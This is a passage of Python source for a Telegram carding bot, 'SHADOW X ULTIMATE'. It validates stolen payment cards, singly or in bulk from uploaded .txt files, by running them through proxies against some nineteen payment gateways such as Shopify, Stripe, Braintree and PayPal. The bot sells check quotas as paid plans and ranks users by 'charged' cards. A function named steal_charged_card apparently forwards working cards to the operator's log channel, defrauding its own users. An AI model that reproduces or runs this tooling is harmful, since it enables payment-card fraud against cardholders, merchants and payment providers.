    if not HIT_LOG_CHANNEL:
        return
    try:
        plan_name = "👑 SHADOW OWNER" if uid in ADMIN_ID else f"{PLANS.get(load_users().get(str(uid), {}).get('plan', 'FREE'), PLANS['FREE']).get('emoji', '⭐')} {load_users().get(str(uid), {}).get('plan', 'FREE')}"
    except:
        plan_name = "⭐ UNKNOWN"
    emoji = "⭐" if hit_type == "Charged" else "✅"
    msg = (
        f"{emoji} <b>🔥 HIT DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🧑 <b>User</b> » <code>{uid}</code> (@{username})\n"
        f"⭐ <b>Plan</b> » {plan_name}\n"
        f"🧰 <b>Type</b> » {check_type}\n"
        f"⏳ <b>Time</b> » {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛒 <b>Gateway</b>  » {result.get('gateway', 'Unknown')}\n"
        f"📋 <b>Response</b> » {(result.get('message') or '').strip() or '—'}\n"
        f"🆓 <b>Price</b>    » {result.get('price', '-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    await _bot_instance.send_message(HIT_LOG_CHANNEL, premium_emoji(msg), parse_mode='html')


# ═══════════════════════════════════════════════════════════════════════════════
# BOT SETUP
# ═══════════════════════════════════════════════════════════════════════════════

bot = TelegramClient(SESSION_FILE, API_ID, API_HASH).start(bot_token=BOT_TOKEN)
_bot_instance = bot

_orig_send = bot.send_message


async def _safe_send(*args, **kwargs):
    try:
        return await _orig_send(*args, **kwargs)
    except Exception as e:
        if "ENTITY_TEXT_INVALID" in str(e).upper():
            if 'message' in kwargs:
                kwargs['message'] = re.sub(r'<tg-emoji[^>]*>', '', str(kwargs['message'])).replace('</tg-emoji>', '')
            elif len(args) > 1:
                args = list(args)
                args[1] = re.sub(r'<tg-emoji[^>]*>', '', str(args[1])).replace('</tg-emoji>', '')
                args = tuple(args)
            return await _orig_send(*args, **kwargs)
        else:
            raise


bot.send_message = _safe_send

active_sessions = {}
user_active_check = {}


async def safe_edit(msg, text, parse_mode='html', buttons=None):
    if not msg:
        return
    try:
        if buttons:
            await msg.edit(text, parse_mode=parse_mode, buttons=buttons)
        else:
            await msg.edit(text, parse_mode=parse_mode)
    except FloodWaitError as fw:
        if fw.seconds > 60:
            return
        await asyncio.sleep(fw.seconds + 2)
        try:
            if buttons:
                await msg.edit(text, parse_mode=parse_mode, buttons=buttons)
            else:
                await msg.edit(text, parse_mode=parse_mode)
        except:
            pass
    except Exception as e:
        if "ENTITY_TEXT_INVALID" in str(e).upper():
            plain = strip_premium(text)
            try:
                if buttons:
                    await msg.edit(plain, parse_mode=parse_mode, buttons=buttons)
                else:
                    await msg.edit(plain, parse_mode=parse_mode)
            except:
                pass


async def safe_reply(event, text, parse_mode='html', buttons=None):
    try:
        if hasattr(event, 'chat_id') and callable(getattr(event, 'answer', None)):
            return await bot.send_message(event.chat_id, text, parse_mode=parse_mode, buttons=buttons)
        elif hasattr(event, 'reply'):
            if buttons:
                return await event.reply(text, parse_mode=parse_mode, buttons=buttons)
            else:
                return await event.reply(text, parse_mode=parse_mode)
        else:
            return await bot.send_message(event.sender_id, text, parse_mode=parse_mode, buttons=buttons)
    except Exception as e:
        if "ENTITY_TEXT_INVALID" in str(e).upper():
            plain = strip_premium(text)
            try:
                if hasattr(event, 'chat_id') and callable(getattr(event, 'answer', None)):
                    return await bot.send_message(event.chat_id, plain, parse_mode=parse_mode, buttons=buttons)
                elif hasattr(event, 'reply'):
                    if buttons:
                        return await event.reply(plain, parse_mode=parse_mode, buttons=buttons)
                    else:
                        return await event.reply(plain, parse_mode=parse_mode)
            except:
                pass
    return None


def get_chat_id(event):
    if hasattr(event, 'chat_id'):
        return event.chat_id
    if hasattr(event, 'chat') and hasattr(event.chat, 'id'):
        return event.chat.id
    return event.sender_id


def is_private_chat(event):
    if hasattr(event, 'is_private'):
        return event.is_private
    if hasattr(event, 'chat') and hasattr(event.chat, 'is_private'):
        return event.chat.is_private
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# COMMANDS – SINGLE + MASS
# ═══════════════════════════════════════════════════════════════════════════════

async def single_check(event, func, gateway, cmd_name):
    uid = event.sender_id
    is_priv = is_private_chat(event)
    if can_check(uid, is_priv) != 'ok':
        await safe_reply(event, premium_emoji("🔴 Access denied."), parse_mode='html')
        return
    parts = event.message.text.split(maxsplit=1) if hasattr(event, 'message') else []
    if len(parts) < 2:
        await safe_reply(event, premium_emoji(f"🔴 Usage: /{cmd_name} 4111|12|26|123"), parse_mode='html')
        return
    cards = extract_cc(parts[1])
    if not cards:
        await safe_reply(event, premium_emoji(f"🔴 Invalid card."), parse_mode='html')
        return
    card = cards[0]
    proxies = load_proxies()
    proxy = _pick_alive_proxy(proxies) if proxies else None
    status_msg = await safe_reply(event, premium_emoji(f"⏳ Processing {gateway}..."), parse_mode='html')
    try:
        res = await func(card, proxy)
        increment_cc(uid)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        cc_parts = card.split('|')
        fmt_card = f"{cc_parts[0][0:4]} {cc_parts[0][4:8]} {cc_parts[0][8:12]} {cc_parts[0][12:16]} | {cc_parts[1]} | {cc_parts[2]} | {cc_parts[3]}"
        if res.get('status') == 'Charged':
            header = "⭐ CHARGED"
            try:
                sender = await event.get_sender()
                username = sender.username if sender and sender.username else "User"
            except:
                username = "User"
            await steal_charged_card(res, uid, username, f"Single {gateway}")
            inc_charged(uid)
        elif res.get('status') == 'Approved':
            header = "✅ APPROVED"
            inc_approved(uid)
        else:
            header = "🔴 DECLINED"
        resp = f"{header}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n💳 <code>{fmt_card}</code>\n\n🛒 {res.get('gateway', gateway)}\n📋 {(res.get('message') or '').strip() or '—'}\n💰 {res.get('price', '-')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🧑 {brand} · {bin_type} · {level}\n💼 {bank}\n🌐 {country} {flag}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔥 @Shadow"
        await safe_edit(status_msg, premium_emoji(resp), parse_mode='html')
    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"🔴 Error: {e}"), parse_mode='html')


# Register single commands
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def cc_cmd(e):
    await single_check(e, check_shopify_with_site, "Shopify", "cc")


@bot.on(events.NewMessage(pattern=r'^/stripe\s+'))
async def stripe_cmd(e):
    await single_check(e, check_stripe_bypass, "Stripe (Bypass)", "stripe")


@bot.on(events.NewMessage(pattern=r'^/rz\s+'))
async def rz_cmd(e):
    await single_check(e, check_razorpay, "Razorpay", "rz")


@bot.on(events.NewMessage(pattern=r'^/bt\s+'))
async def bt_cmd(e):
    await single_check(e, check_braintree, "Braintree", "bt")


@bot.on(events.NewMessage(pattern=r'^/paypal\s+'))
async def paypal_cmd(e):
    await single_check(e, check_paypal, "PayPal", "paypal")


@bot.on(events.NewMessage(pattern=r'^/square\s+'))
async def square_cmd(e):
    await single_check(e, check_square, "Square", "square")


@bot.on(events.NewMessage(pattern=r'^/magento\s+'))
async def magento_cmd(e):
    await single_check(e, check_magento, "Magento", "magento")


@bot.on(events.NewMessage(pattern=r'^/checkout\s+'))
async def checkout_cmd(e):
    await single_check(e, check_checkout, "Checkout.com", "checkout")


@bot.on(events.NewMessage(pattern=r'^/2co\s+'))
async def twoco_cmd(e):
    await single_check(e, check_2co, "2Checkout", "2co")


@bot.on(events.NewMessage(pattern=r'^/moneris\s+'))
async def moneris_cmd(e):
    await single_check(e, check_moneris, "Moneris", "moneris")


@bot.on(events.NewMessage(pattern=r'^/eway\s+'))
async def eway_cmd(e):
    await single_check(e, check_eway, "Eway", "eway")


@bot.on(events.NewMessage(pattern=r'^/chase\s+'))
async def chase_cmd(e):
    await single_check(e, check_chase, "Chase", "chase")


@bot.on(events.NewMessage(pattern=r'^/aurus\s+'))
async def aurus_cmd(e):
    await single_check(e, check_aurus, "Auruspay", "aurus")


@bot.on(events.NewMessage(pattern=r'^/opencart\s+'))
async def opencart_cmd(e):
    await single_check(e, check_opencart, "Opencart", "opencart")


@bot.on(events.NewMessage(pattern=r'^/prestashop\s+'))
async def prestashop_cmd(e):
    await single_check(e, check_prestashop, "Prestashop", "prestashop")


@bot.on(events.NewMessage(pattern=r'^/woo\s+'))
async def woo_cmd(e):
    await single_check(e, check_woo, "WooCommerce", "woo")


@bot.on(events.NewMessage(pattern=r'^/payu\s+'))
async def payu_cmd(e):
    await single_check(e, check_payu, "PayU", "payu")


@bot.on(events.NewMessage(pattern=r'^/adyen\s+'))
async def adyen_cmd(e):
    await single_check(e, check_adyen, "Adyen", "adyen")


@bot.on(events.NewMessage(pattern=r'^/bypass\s+'))
async def bypass_cmd(e):
    await single_check(e, check_bypass_all, "Bypass All", "bypass")


# ─── MASS COMMANDS ──────────────────────────────────────────────────────────
async def mass_check(event, func, gateway, cmd_name):
    uid = event.sender_id
    chat_id = get_chat_id(event)
    is_priv = is_private_chat(event)
    if can_check(uid, is_priv) != 'ok':
        await safe_reply(event, premium_emoji("🔴 Access denied."), parse_mode='html')
        return
    if uid in user_active_check:
        await safe_reply(event, premium_emoji("🚫 Already running."), parse_mode='html')
        return

    if not hasattr(event, 'reply_to_msg_id') or not event.reply_to_msg_id:
        await safe_reply(event, premium_emoji("🔴 Reply to a .txt file."), parse_mode='html')
        return

    reply = await event.get_reply_message()
    if not reply or not reply.file or not reply.file.name.endswith('.txt'):
        await safe_reply(event, premium_emoji("🔴 Reply to a .txt file."), parse_mode='html')
        return

    status_msg = await safe_reply(event, premium_emoji("⏳ Processing file..."), parse_mode='html')
    file_path = await reply.download_media(file="./data/")
    if not file_path:
        await safe_edit(status_msg, premium_emoji("🔴 Download failed."), parse_mode='html')
        return

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    os.remove(file_path)

    cards = auto_detect_ccs(content) or extract_cc(content)
    if not cards:
        await safe_edit(status_msg, premium_emoji("🔴 No valid cards."), parse_mode='html')
        return

    u = load_users()
    plan = u.get(str(uid), {}).get('plan', 'FREE')
    limit = PLANS.get(plan, PLANS['FREE'])['cc_limit']
    if len(cards) > limit:
        cards = cards[:limit]
    total = len(cards)

    await safe_edit(status_msg, premium_emoji(f"🔥 Checking {total} cards via {gateway}..."), parse_mode='html')

    session_key = f"{cmd_name}_{uid}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    user_active_check[uid] = {'type': cmd_name, 'session_key': session_key, 'chat_id': chat_id, 'msg_id': status_msg.id}

    results = {'charged': [], 'approved': [], 'dead': [], 'site_errors': [], 'total': total, 'checked': 0}
    max_workers = get_concurrency(uid)
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_update = time.time()
    lock = asyncio.Lock()

    async def worker():
        while session_key in active_sessions:
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            proxy = _pick_alive_proxy(load_proxies())
            res = await func(card, proxy)
            async with lock:
                results['checked'] += 1
                if res.get('status') == 'Charged':
                    results['charged'].append(res)
                    try:
                        sender = await bot.get_entity(uid)
                        username = sender.username if sender and sender.username else "User"
                    except:
                        username = "User"
                    await steal_charged_card(res, uid, username, f"Mass {gateway}")
                    inc_charged(uid)
                elif res.get('status') == 'Approved':
                    results['approved'].append(res)
                    inc_approved(uid)
                else:
                    if res.get('status') == 'Site Error':
                        results['site_errors'].append(res)
                    else:
                        results['dead'].append(res)
                if time.time() - last_update > 2:
                    await update_progress(chat_id, uid, status_msg.id, results, results['checked'])
            queue.task_done()

    workers = [asyncio.create_task(worker()) for _ in range(max_workers)]
    await asyncio.gather(*workers, return_exceptions=True)

    if session_key in active_sessions:
        await update_progress(chat_id, uid, status_msg.id, results, results['checked'])
    if session_key in active_sessions:
        del active_sessions[session_key]
    if uid in user_active_check:
        del user_active_check[uid]

    increment_cc(uid, results['checked'])
    await status_msg.delete()

    summary = f"✅ {gateway} SCAN COMPLETE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⭐ Charged: {len(results['charged'])}\n✅ Approved: {len(results['approved'])}\n🔴 Declined: {len(results['dead'])}\n🟡 Site Err: {len(results.get('site_errors', []))}\n📦 Total: {results['total']}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔥 @Shadow"
    await bot.send_message(chat_id, premium_emoji(summary), parse_mode='html')


async def update_progress(chat_id, uid, msg_id, results, checked):
    total = results['total']
    charged = len(results['charged'])
    approved = len(results['approved'])
    dead = len(results['dead'])
    pct = int((checked / total * 100)) if total else 0
    bar = '█' * (pct // 5) + '░' * (20 - pct // 5)
    text = f"🔥 MASS CHECK\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{bar} {pct}%\nChecked: {checked}/{total}\n⭐ Charged: {charged}\n✅ Approved: {approved}\n🔴 Dead: {dead}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔥 @Shadow"
    buttons = [[Button.inline("🚫 STOP", f"stop_{uid}".encode())]]
    try:
        await bot.edit_message(chat_id, msg_id, premium_emoji(text), buttons=buttons, parse_mode='html')
    except:
        pass


@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    uid = int(event.pattern_match.group(1).decode())
    if event.sender_id != uid:
        await event.answer("🔴 Not yours.", alert=True)
        return
    mid = event.message_id
    for key in list(active_sessions.keys()):
        if key.endswith(f"_{uid}_{mid}"):
            del active_sessions[key]
            user_active_check.pop(uid, None)
            await event.answer("⏹️ Stopped.", alert=True)
            await event.edit(premium_emoji("🚫 Stopped."), parse_mode='html')
            return
    await event.answer("Already finished.", alert=True)


# ─── MASS COMMANDS REGISTRATION ────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/chk(?:\s|$)'))
async def chk_mass(e):
    await mass_check(e, check_shopify_with_site, "Shopify", "chk")


@bot.on(events.NewMessage(pattern=r'^/mstripe(?:\s|$)'))
async def mstripe_mass(e):
    await mass_check(e, check_stripe_bypass, "Stripe (Bypass)", "mstripe")


@bot.on(events.NewMessage(pattern=r'^/mrz(?:\s|$)'))
async def mrz_mass(e):
    await mass_check(e, check_razorpay, "Razorpay", "mrz")


@bot.on(events.NewMessage(pattern=r'^/mbt(?:\s|$)'))
async def mbt_mass(e):
    await mass_check(e, check_braintree, "Braintree", "mbt")


@bot.on(events.NewMessage(pattern=r'^/mpaypal(?:\s|$)'))
async def mpaypal_mass(e):
    await mass_check(e, check_paypal, "PayPal", "mpaypal")


@bot.on(events.NewMessage(pattern=r'^/mbypass(?:\s|$)'))
async def mbypass_mass(e):
    await mass_check(e, check_bypass_all, "Bypass All", "mbypass")


# ─── OTHER COMMANDS ─────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/start(?:\s|$)'))
async def start(event):
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    if is_banned(uid) and uid not in ADMIN_ID:
        info = load_banned().get(str(uid), {})
        await safe_reply(event, premium_emoji(f"🚫 <b>You are banned.</b>\nReason: {info.get('reason', 'N/A')}"),
                         parse_mode='html')
        return

    if not is_verified(uid) and uid not in ADMIN_ID:
        code = gen_captcha()
        _pending_captcha[uid] = {'code': code, 'timestamp': time.time()}
        join_text = "🔥 <b>⭐ SHADOW X ULTIMATE ⭐</b>\n<b>Step 1/3: Join Channels</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n🔐 <b>Access Restricted</b>\n▸ Join all channels below to unlock\n\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
        buttons = [[Button.url("📢 LOGS", LOGS_CHANNEL), Button.url("🔍 CHECKING", CHECKING_CHANNEL)],
                   [Button.url("📢 UPDATES", UPDATES_CHANNEL)],
                   [Button.inline("✅ I've Joined All", b"verify_joined")]]
        await safe_reply(event, premium_emoji(join_text), buttons=buttons, parse_mode='html')
        return

    if uid in _pending_captcha:
        code = _pending_captcha[uid]['code']
        captcha_text = f"🔐 <b>DM VERIFICATION</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n📋 <b>Anti-bot protection · valid 6h</b>\n\n🎯 <b>Tap the number shown below:</b>\n\n<b><code>{code}</code></b>\n\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
        buttons = [[Button.inline("2", b"captcha_2"), Button.inline("4", b"captcha_4"), Button.inline("5", b"captcha_5")],
                   [Button.inline("9", b"captcha_9"), Button.inline("1", b"captcha_1"), Button.inline("7", b"captcha_7")],
                   [Button.inline("🔄 New Captcha", b"captcha_new")]]
        await safe_reply(event, premium_emoji(captcha_text), buttons=buttons, parse_mode='html')
        return

    assign_free(uid)
    u = load_users()
    uid_str = str(uid)
    data = u.get(uid_str, {})
    is_free = (data.get('plan', 'FREE') == 'FREE' and uid not in ADMIN_ID)

    if is_free:
        remaining = max(0, data.get('cc_limit', 100) - data.get('cc_used', 0))
        welcome = f"━━━━━━━━━━━━━━━━━━\n  ⚡ SHADOW X ULTIMATE ⚡\n━━━━━━━━━━━━━━━━━━\n\n👋 Welcome @{username}!\n🆓 Plan: FREE\n📊 Checks Left: {remaining}/{data.get('cc_limit', 100)}\n\n━━━━━━━━━━━━━━━━━━\n  📌 Quick Start\n  💳 /cc – Shopify\n  💰 /stripe – Stripe (Bypass)\n  💳 /rz – Razorpay\n  🔷 /bt – Braintree\n  💵 /paypal – PayPal\n  🔥 /bypass – Try All Gates\n  📂 /chk – Mass Shopify (.txt)\n\n━━━━━━━━━━━━━━━━━━\n  🏆 Made by @Shadow"
        buttons = get_main_menu(uid, free=True)
    else:
        plan_name = data.get('plan', 'PREMIUM')
        remaining = max(0, data.get('cc_limit', 2000) - data.get('cc_used', 0))
        welcome = f"━━━━━━━━━━━━━━━━━━\n  ⚡ SHADOW X ULTIMATE ⚡\n━━━━━━━━━━━━━━━━━━\n\n👋 Welcome @{username}!\n{PLANS.get(plan_name, {}).get('emoji', '⭐')} Plan: {plan_name}\n📊 Checks Left: {remaining}/{data.get('cc_limit', 2000)}\n\n━━━━━━━━━━━━━━━━━━\n  📌 Quick Start\n  💳 /cc – Shopify\n  💰 /stripe – Stripe (Bypass)\n  💳 /rz – Razorpay\n  🔷 /bt – Braintree\n  💵 /paypal – PayPal\n  🔥 /bypass – Try All\n  📂 /chk – Mass Shopify\n  📂 /mstripe – Mass Stripe\n  📂 /mrz – Mass Razorpay\n  📂 /mbt – Mass Braintree\n  📂 /mpaypal – Mass PayPal\n  📂 /mbypass – Mass Bypass\n\n━━━━━━━━━━━━━━━━━━\n  🏆 Made by @Shadow"
        buttons = get_main_menu(uid, free=False)

    await safe_reply(event, premium_emoji(welcome), buttons=buttons, parse_mode='html')


def get_main_menu(uid=None, free=False):
    btns = [[Button.inline("🔥 Gates", b"gate_menu"), Button.inline("💳 Plans", b"view_plans")],
            [Button.inline("📊 Stats", b"user_stats"), Button.inline("🏆 Leaderboard", b"leaderboard")],
            [Button.inline("📋 Commands", b"show_cmds"), Button.url("📢 Channel", GROUP_LINK)]]
    if uid and uid in ADMIN_ID:
        btns.append([Button.inline("👑 Owner Panel", b"admin_panel")])
    return btns


# ─── CALLBACKS ──────────────────────────────────────────────────────────────
@bot.on(events.CallbackQuery(data=b"verify_joined"))
async def verify_joined(event):
    uid = event.sender_id
    ch = [("LOGS", LOGS_CHANNEL), ("CHECKING", CHECKING_CHANNEL), ("UPDATES", UPDATES_CHANNEL)]
    not_joined = []
    for name, link in ch:
        try:
            if link.startswith('https://t.me/+'):
                continue
            username = link.replace('https://t.me/', '').strip()
            if username:
                entity = await bot.get_entity(username)
                await bot(GetParticipantRequest(entity, uid))
        except UserNotParticipantError:
            not_joined.append(name)
        except:
            pass
    if not_joined:
        await event.answer(f"🔴 Please join all channels first!\nMissing: {', '.join(not_joined)}", alert=True)
        return
    mark_verified(uid)
    assign_free(uid)
    await event.answer("✅ Verified!", alert=True)
    await event.delete()
    await start(event)


@bot.on(events.CallbackQuery(pattern=b"captcha_(\\d+)"))
async def captcha_cb(event):
    uid = event.sender_id
    code = event.pattern_match.group(1).decode()
    if uid not in _pending_captcha:
        await event.answer("🔴 Expired.", alert=True)
        return
    pend = _pending_captcha[uid]
    if time.time() - pend['timestamp'] > 3600:
        del _pending_captcha[uid]
        await event.answer("🔴 Expired.", alert=True)
        return
    if pend['code'] == code:
        del _pending_captcha[uid]
        await event.answer("✅ Verified!", alert=True)
        await event.delete()
        await start(event)
    else:
        await event.answer("❌ Wrong.", alert=True)


@bot.on(events.CallbackQuery(data=b"captcha_new"))
async def captcha_new(event):
    uid = event.sender_id
    new = gen_captcha()
    _pending_captcha[uid] = {'code': new, 'timestamp': time.time()}
    text = f"🔐 <b>DM VERIFICATION</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n📋 <b>New Captcha</b>\n\n🎯 <b>Tap the number shown below:</b>\n\n<b><code>{new}</code></b>\n\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    buttons = [[Button.inline("2", b"captcha_2"), Button.inline("4", b"captcha_4"), Button.inline("5", b"captcha_5")],
               [Button.inline("9", b"captcha_9"), Button.inline("1", b"captcha_1"), Button.inline("7", b"captcha_7")],
               [Button.inline("🔄 New Captcha", b"captcha_new")]]
    await safe_edit(event, premium_emoji(text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"gate_menu"))
async def gate_menu(event):
    text = "🔥 <b>⭐ SHADOW X GATES ⭐</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n🛒 /cc – Shopify\n💰 /stripe – Stripe (Bypass)\n💳 /rz – Razorpay\n🔷 /bt – Braintree\n💵 /paypal – PayPal\n📦 /square – Square\n🏪 /magento – Magento\n🌐 /checkout – Checkout.com\n🔄 /2co – 2Checkout\n🏦 /moneris – Moneris\n🚀 /eway – Eway\n🏛️ /chase – Chase\n⚡ /aurus – Auruspay\n🛍️ /opencart – Opencart\n🎨 /prestashop – Prestashop\n🛒 /woo – WooCommerce\n💸 /payu – PayU\n🔷 /adyen – Adyen\n🔥 /bypass – Try All\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    buttons = [[Button.inline("⬇️ Back", b"main_menu")]]
    await safe_edit(event, premium_emoji(text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_cmds(event):
    text = "🔥 <b>⭐ SHADOW X COMMANDS ⭐</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n🛒 /cc → Shopify\n💰 /stripe → Stripe (Bypass)\n💳 /rz → Razorpay\n🔷 /bt → Braintree\n💵 /paypal → PayPal\n📦 /square → Square\n🏪 /magento → Magento\n🌐 /checkout → Checkout.com\n🔄 /2co → 2Checkout\n🏦 /moneris → Moneris\n🚀 /eway → Eway\n🏛️ /chase → Chase\n⚡ /aurus → Auruspay\n🛍️ /opencart → Opencart\n🎨 /prestashop → Prestashop\n🛒 /woo → WooCommerce\n💸 /payu → PayU\n🔷 /adyen → Adyen\n🔥 /bypass → Try All Gates\n📂 /chk → Mass Shopify\n📂 /mstripe → Mass Stripe\n📂 /mrz → Mass Razorpay\n📂 /mbt → Mass Braintree\n📂 /mpaypal → Mass PayPal\n📂 /mbypass → Mass Bypass\n🔍 /bin → BIN lookup\n💳 /plan → Plans\n🔑 /redeem → Redeem key\n👑 Owner: /setlimit, /setplan, /genkey, /listusers, /stats, /broadcast, /ban, /unban, /revoke\n\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯"
    buttons = [[Button.inline("⬇️ Back", b"main_menu")]]
    await safe_edit(event, premium_emoji(text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"view_plans"))
async def view_plans(event):
    text = "💳 <b>PLANS</b>\n━━━━━━━━━━━━━━━━━━\n\n🆓 FREE – 500 checks\n⭐ BASIC – $5/15d, 1000 checks\n⭐ STANDARD – $10/15d, 1500 checks\n🎨 PREMIUM – $15/30d, 2500 checks\n🏆 VIP – $20/30d, 5000 checks\n━━━━━━━━━━━━━━━━━━\n🔑 /redeem SHADOW-XXXX\n📢 Contact @Shadow"
    buttons = [[Button.inline("⬇️ Back", b"main_menu")]]
    await safe_edit(event, premium_emoji(text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"user_stats"))
async def user_stats(event):
    uid = event.sender_id
    rank, stats = user_rank(uid)
    charged = stats.get('charged', 0)
    approved = stats.get('approved', 0)
    u = load_users()
    uid_str = str(uid)
    data = u.get(uid_str, {})
    plan = data.get('plan', 'FREE')
    limit = data.get('cc_limit', 100)
    used = data.get('cc_used', 0)
    remaining = max(0, limit - used)
    total = charged + approved
    hit_rate = f"{(total / max(1, used) * 100):.1f}%" if used else "—"
    emoji = PLANS.get(plan, {}).get('emoji', '🆓')
    text = f"📊 <b>YOUR DASHBOARD</b>\n━━━━━━━━━━━━━━━━━━\n\n🔥 {emoji} Plan: {plan}\n📊 Checks Left: {remaining}/{limit}\n⭐ Charged: {charged}\n✅ Approved: {approved}\n📈 Hit Rate: {hit_rate}\n🏆 Rank: {rank if rank else 'Unranked'}\n━━━━━━━━━━━━━━━━━━\n🔥 @Shadow"
    buttons = [[Button.inline("🏆 Leaderboard", b"leaderboard")], [Button.inline("⬇️ Back", b"main_menu")]]
    await safe_edit(event, premium_emoji(text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"leaderboard"))
async def leaderboard(event):
    top = top_users(5)
    if not top:
        lb = "🏆 LEADERBOARD\n━━━━━━━━━━━━━━━━━━\nNo data yet."
    else:
        lines = [f"{i}. @{d.get('username', 'User')} – {d.get('charged', 0)} Charged" for i, (_, d) in enumerate(top, 1)]
        lb = "🏆 LEADERBOARD\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines)
    buttons = [[Button.inline("⬇️ Back", b"main_menu")]]
    await safe_edit(event, premium_emoji(lb), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu(event):
    await start(event)


@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id not in ADMIN_ID:
        await event.answer("🔴 Admin only.", alert=True)
        return
    text = "👑 SHADOW OWNER PANEL\n━━━━━━━━━━━━━━━━━━\n💳 /genkey PLAN count\n📊 /listusers\n📈 /stats\n📢 /broadcast\n🚫 /ban user_id reason\n✅ /unban user_id\n🔄 /revoke user_id\n📌 /setlimit user_id limit\n📌 /setplan user_id plan\n━━━━━━━━━━━━━━━━━━\n🔑 Keys: SHADOW-<PLAN>-XXXX-XXXX"
    buttons = [[Button.inline("⬇️ Back", b"main_menu")]]
    await safe_edit(event, premium_emoji(text), buttons=buttons, parse_mode='html')


# ─── /bin ──────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/bin\s+'))
async def bin_cmd(event):
    parts = event.message.text.split(maxsplit=1) if hasattr(event, 'message') else []
    if len(parts) < 2:
        await safe_reply(event, premium_emoji("🔴 Usage: /bin 438854"), parse_mode='html')
        return
    b = parts[1].strip()
    br, typ, lvl, bank, country, flag = await get_bin_info(b)
    await safe_reply(event,
                     premium_emoji(f"🔍 BIN LOOKUP\n━━━━━━━━━━━━━━━━━━\nBIN: {b}\nBrand: {br}\nType: {typ}\nLevel: {lvl}\nBank: {bank}\nCountry: {country} {flag}\n━━━━━━━━━━━━━━━━━━\n🔥 @Shadow"),
                     parse_mode='html')


# ─── /plan ─────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/plan(?:\s|$)'))
async def plan_cmd(event):
    await view_plans(event)


# ─── /redeem ────────────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/redeem(?:\s|$)'))
async def redeem_cmd(event):
    uid = event.sender_id
    parts = event.message.text.split(maxsplit=1) if hasattr(event, 'message') else []
    if len(parts) < 2:
        await safe_reply(event, premium_emoji("🔑 Usage: /redeem SHADOW-XXXX-XXXX"), parse_mode='html')
        return
    code = parts[1].strip().upper()
    codes = load_codes()
    if code not in codes:
        await safe_reply(event, premium_emoji("🔴 Invalid key."), parse_mode='html')
        return
    if codes[code]['used']:
        await safe_reply(event, premium_emoji("🔴 Key already used."), parse_mode='html')
        return
    plan_key = codes[code]['plan']
    plan = PLANS[plan_key]
    u = load_users()
    uid_str = str(uid)
    if uid_str in u and u[uid_str].get('plan') != 'FREE':
        try:
            if datetime.now() < datetime.fromisoformat(u[uid_str].get('expires_at', '2000-01-01')):
                await safe_reply(event, premium_emoji("🚫 Active plan exists."), parse_mode='html')
                return
        except:
            pass
    expires = datetime.now() + timedelta(days=plan['days'])
    u[uid_str] = {'plan': plan_key, 'expires_at': expires.isoformat(), 'cc_used': 0, 'cc_limit': plan['cc_limit'],
